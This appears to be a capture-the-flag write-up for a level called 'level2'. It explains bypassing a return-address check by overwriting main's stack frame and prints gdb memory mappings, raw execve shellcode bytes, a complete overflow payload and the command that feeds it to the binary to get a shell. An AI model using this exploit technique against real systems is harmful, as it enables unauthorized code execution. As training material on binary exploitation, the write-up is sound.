Basically the same as level1, except the return address is checked after `gets`.  It exits early if the return address matches `0xbXXXXXXX`.  This means we can't just return wherever we want.

Our stack is mapped to `0xbffdf000-0xc0000000` (see gdb later), so we can't use that as return address.  libc is mapped to `0xb7e2c000-0xb7fd2000`, we can't use that either.

Come to think of it, no mapped address range is viable except `0x08048000-0x0804a000` which is the program itself.  Since there's no ready-made win path in the program, there's nothing we can do.  At least, in this stack frame.

If we can't change the return address of the current frame, why not change the parent stack frame?  Since the stack grows downwards, the previous stack frame starts and ends at a higher address than the current frame.  If we continue writing, we should be able to overwrite the return address of `main`.  We just need to be careful and not change the saved `ebp` and `eip` of `p`.

Find `/bin/sh` in libc:

```
gdb ~/level2
(gdb) set disassembly-flavor intel
(gdb) set exec-wrapper env -i
(gdb) b main
Breakpoint 1 at 0x8048542
(gdb) r
Starting program: /home/user/level2/level2

Breakpoint 1, 0x08048542 in main ()
(gdb) info proc mappings
process 5122
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
	0xb7e2b000 0xb7e2c000     0x1000        0x0
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0
	0xb7fdb000 0xb7fdd000     0x2000        0x0
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.
(gdb) x/s 0xb7f8cc58
0xb7f8cc58:	 "/bin/sh"
```

Payload:

```sh
{
    # 8 bytes
    printf '/bin/sh\0'
    
    # 8 bytes
    perl -e 'print pack("L<" x 2, 0xbffffdfc, 0x00000000)'
    
    # 12 bytes
    # printf "\xB8\x01\x00\x00\x00\xBB\x68\x00\x00\x00\xCD\x80"
    
    # 22 bytes
    printf "\xB8\x0B\x00\x00\x00\xBB\xFC\xFD\xFF\xBF\xB9\x04\xFE\xFF\xBF\xBA\x00\x00\x00\x00\xCD\x80"

    perl -e 'print "\xff" x (76 - 8 - 8 - 22)'

    # saved ebp and saved eip from above
    perl -e 'print pack("L<" x 2, 0xbffffe58, 0x804854a)'
    
    # stack alignment
    perl -e 'print "A" x 8'
    
    # addresses of gets() stack buffer (saved ebp) and system() (saved eip)
    # + 4 -> saved ebp
    # + 4 -> saved eip
    perl -e 'print pack("L<" x 2, 0xbffffdfc - 40, 0xbffffdfc + 16)'
} > /tmp/2
```

Run with:

```
cat /tmp/2 - | env -i ~/level2
```
